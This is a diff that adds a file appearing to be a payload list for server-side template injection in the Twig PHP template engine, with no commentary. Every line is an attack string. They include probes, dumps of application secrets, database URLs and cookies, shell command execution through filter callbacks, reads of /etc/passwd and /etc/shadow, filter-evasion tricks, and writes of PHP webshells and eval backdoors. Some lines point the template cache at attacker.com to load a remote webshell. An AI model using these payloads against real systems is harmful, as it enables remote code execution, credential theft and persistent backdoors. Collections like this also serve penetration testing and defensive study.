@@ -1,0 +1,158 @@
+{{7*7}}
+{{7*'7'}}
+{{_self}}
+{{app}}
+{{dump(app)}}
+{{_context}}
+{{dump(_context)}}
+{{'a'.toUpperCase()}}
+{{'a'|upper}}
+{{['id']|filter('system')}}
+{{['id']|map('system')}}
+{{['id']|reduce('system')}}
+{{['id']|sort('system')}}
+{{['id','']|sort('system')}}
+{{{'id':0}|map('system')}}
+{{'id'|filter('exec')}}
+{{'id'|map('exec')}}
+{{'id'|filter('passthru')}}
+{{'id'|map('passthru')}}
+{{'id'|filter('shell_exec')}}
+{{'id'|map('shell_exec')}}
+{{['cat /etc/passwd']|filter('system')}}
+{{['cat /etc/passwd']|map('system')}}
+{{['whoami']|filter('system')}}
+{{['ls -la']|map('system')}}
+{{['uname -a']|filter('system')}}
+{{['env']|map('system')}}
+{{['pwd']|filter('system')}}
+{{_self.env}}
+{{_self.env.getExtensions()}}
+{{_self.env.registerUndefinedFilterCallback('exec')}}
+{{_self.env.registerUndefinedFilterCallback('system')}}
+{{_self.env.registerUndefinedFilterCallback('passthru')}}
+{{_self.env.registerUndefinedFilterCallback('shell_exec')}}
+{{_self.env.registerUndefinedFilterCallback('popen')}}
+{{_self.env.setCache("/var/www/html")}}
+{{_self.env.enableDebug()}}
+{{_self.env.enableAutoReload()}}
+{{_self.env.disableStrictVariables()}}
+{{_self.env.getCache()}}
+{{_self.env.getTags()}}
+{{_self.env.getFilters()}}
+{{_self.env.getFunctions()}}
+{{_self.env.getTests()}}
+{{_self.env.getGlobals()}}
+{{_self.env.getLoader()}}
+{{_self.env.getCharset()}}
+{{_self.env.isDebug()}}
+{{_self.env.isAutoReload()}}
+{{_self.env.isStrictVariables()}}
+{{app.request}}
+{{app.request.server}}
+{{app.request.server.all}}
+{{app.request.query}}
+{{app.request.query.all}}
+{{app.request.request}}
+{{app.request.cookies}}
+{{app.request.files}}
+{{app.request.server.get('APP_SECRET')}}
+{{app.request.server.get('DATABASE_URL')}}
+{{app.request.server.get('SECRET_KEY')}}
+{{app.session}}
+{{app.user}}
+{{app.environment}}
+{{app.debug}}
+{{'<?php system($_GET[cmd]); ?>'|file_put_contents('shell.php')}}
+{{'<?php phpinfo(); ?>'|file_put_contents('info.php')}}
+{{'<?php eval($_POST[cmd]); ?>'|file_put_contents('backdoor.php')}}
+{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
+{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
+{{_self.env.registerUndefinedFilterCallback('passthru')}}{{_self.env.getFilter('id')}}
+{{_self.env.registerUndefinedFilterCallback('shell_exec')}}{{_self.env.getFilter('id')}}
+{{_self.env.registerUndefinedFilterCallback('assert')}}{{_self.env.getFilter('phpinfo()')}}
+{{_self.env.registerUndefinedFilterCallback('create_function')}}{{_self.env.getFilter('phpinfo();')}}
+{{["id"]|sort("system")}}
+{{["id"]|merge|sort("system")}}
+{{{"<?php phpinfo();":1}|sort("system")}}
+{{{"<?php system($_GET[x]);":1}|sort("file_put_contents")}}
+{{"<?php system($_GET[x]);"|file_put_contents("shell.php")}}
+{{"<?php phpinfo();"|file_put_contents("info.php")}}
+{{"<?php eval($_POST[x]);"|file_put_contents("eval.php")}}
+{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('cat /etc/passwd')}}
+{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /etc/passwd')}}
+{{_self.env.registerUndefinedFilterCallback('passthru')}}{{_self.env.getFilter('cat /etc/passwd')}}
+{{_self.env.registerUndefinedFilterCallback('shell_exec')}}{{_self.env.getFilter('cat /etc/passwd')}}
+{{_self.env.registerUndefinedFilterCallback('proc_open')}}{{_self.env.getFilter('id')}}
+{{_self.env.registerUndefinedFilterCallback('popen')}}{{_self.env.getFilter('id')}}
+{{_self.env.registerUndefinedFilterCallback('pcntl_exec')}}{{_self.env.getFilter('/bin/bash')}}
+{{_self.env.setCache('ftp://attacker.com:2121')}}
+{{_self.env.setCache('http://attacker.com/webshell.php')}}
+{{_self.env.loadTemplate("/etc/passwd")}}
+{{_self.env.compileSource("/etc/passwd")}}
+{{['id',0]|sort('system')}}
+{{['cat /etc/passwd',0]|sort('system')}}
+{{['whoami',0]|sort('system')}}
+{{['ls -la',0]|sort('system')}}
+{{['uname -a',0]|sort('system')}}
+{{['env',0]|sort('system')}}
+{{['pwd',0]|sort('system')}}
+{{['cat flag.txt',0]|sort('system')}}
+{{['ps aux',0]|sort('system')}}
+{{['ifconfig',0]|sort('system')}}
+{{['netstat -an',0]|sort('system')}}
+{{['cat /etc/shadow',0]|sort('system')}}
+{{'system'('id')}}
+{{'exec'('id')}}
+{{'passthru'('id')}}
+{{'shell_exec'('id')}}
+{{'popen'('id','r')}}
+{{'file_get_contents'('/etc/passwd')}}
+{{'file_put_contents'('shell.php','<?php system($_GET[x]);')}}
+{{'readfile'('/etc/passwd')}}
+{{'highlight_file'('/etc/passwd')}}
+{{'show_source'('/etc/passwd')}}
+{{_self.displayStart}}
+{{_self.blocks}}
+{{_self.macros}}
+{{_self.traits}}
+{{_self.parent}}
+{{_self.sourceContext}}
+{{_self.sourceName}}
+{{_self.sourcePath}}
+{{dump(_self)}}
+{{dump(app)}}
+{{dump(_context)}}
+{{dump(_self.env)}}
+{{['cat${IFS}/etc/passwd']|filter('system')}}
+{{['cat${IFS}/etc/passwd']|map('system')}}
+{{['cat</etc/passwd']|filter('system')}}
+{{['cat<flag.txt']|map('system')}}
+{{'cat /etc/passwd'|split(' ')|join('|')|map('system')}}
+{{_self.env.registerUndefinedFilterCallback('assert')}}{{_self.env.getFilter('system("id")')}}
+{{_self.env.registerUndefinedFilterCallback('create_function')}}{{_self.env.getFilter('system("id");')}}
+{{_self.env.registerUndefinedFilterCallback('call_user_func')}}{{_self.env.getFilter('system","id')}}
+{{_self.env.registerUndefinedFilterCallback('call_user_func_array')}}{{_self.env.getFilter('system',array("id"))}}
+{{_self.env.registerUndefinedFilterCallback('array_map')}}{{_self.env.getFilter('system',array("id"))}}
+{{_self.env.registerUndefinedFilterCallback('array_filter')}}{{_self.env.getFilter('system',array("id"))}}
+{{_self.env.registerUndefinedFilterCallback('usort')}}{{_self.env.getFilter('system')}}
+{{_self.env.registerUndefinedFilterCallback('uasort')}}{{_self.env.getFilter('system')}}
+{{_self.env.registerUndefinedFilterCallback('uksort')}}{{_self.env.getFilter('system')}}
+{{_self.env.registerUndefinedFilterCallback('array_reduce')}}{{_self.env.getFilter('system')}}
+{{_self.env.registerUndefinedFilterCallback('array_walk')}}{{_self.env.getFilter('system')}}
+{{_self.env.registerUndefinedFilterCallback('array_walk_recursive')}}{{_self.env.getFilter('system')}}
+{{_self.env.registerUndefinedFilterCallback('iterator_apply')}}{{_self.env.getFilter('system')}}
+{{_self.env.registerUndefinedFilterCallback('forward_static_call')}}{{_self.env.getFilter('system')}}
+{{_self.env.registerUndefinedFilterCallback('forward_static_call_array')}}{{_self.env.getFilter('system')}}
+{{_self.env.registerUndefinedFilterCallback('register_shutdown_function')}}{{_self.env.getFilter('system')}}
+{{_self.env.registerUndefinedFilterCallback('register_tick_function')}}{{_self.env.getFilter('system')}}
+{{_self.env.getFunction('include')}}
+{{_self.env.getFunction('source')}}
+{{_self.env.getFunction('template_from_string')}}
+{{include('/etc/passwd')}}
+{{source('/etc/passwd')}}
+{{template_from_string("Hello #{7*7}")}}
+{{template_from_string("{{_self}}")}}
+{{max(array('system'),array('id'))}}
+{{min(array('system'),array('id'))}}
+{{sort(array('system','id'))}}
